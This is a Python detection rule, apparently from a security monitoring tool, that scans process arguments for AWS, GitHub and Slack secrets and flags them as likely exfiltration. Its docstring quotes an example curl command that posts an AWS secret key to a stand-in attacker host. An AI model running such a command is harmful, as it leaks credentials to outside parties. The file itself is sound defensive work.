"""Rule: secret_in_process_argv.

The build plan called this ``token_in_payload`` and described matching against
network event "payload" — but the BPF network probe only sees connect-time
metadata (no packet bodies). The signal that's actually achievable is on the
*process* event: argv often contains the secret being shipped out (e.g.
``curl -d "$AWS_SECRET_ACCESS_KEY" attacker.example.com``).
"""

from __future__ import annotations

import re

from ..models import Detection, ListedEvent


# Patterns courtesy of GitHub's secret-scanning regex set:
#   - AWS access key ID
#   - GitHub fine-grained PAT
#   - Slack bot/user tokens
SECRET_PATTERNS = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS access key"),
    (re.compile(r"ghp_[A-Za-z0-9]{36}"), "GitHub PAT"),
    (re.compile(r"xox[bp]-[A-Za-z0-9-]+"), "Slack token"),
]


class TokenInPayloadRule:
    name = "secret_in_network_payload"

    def evaluate(self, le: ListedEvent, context) -> list[Detection]:
        e = le.payload
        if e.type != "process" or not e.process:
            return []

        # Scan every argv element. The first match wins (avoid spamming).
        for arg in e.process.args:
            for pat, label in SECRET_PATTERNS:
                if pat.search(arg):
                    return [
                        Detection(
                            run_id=le.run_id,
                            event_id=le.id,
                            rule_name=self.name,
                            severity="critical",
                            message=(
                                f"{label} appears in argv of {e.process.comm!r} (pid {e.process.pid}) — "
                                f"likely exfiltration in flight"
                            ),
                        )
                    ]
        return []
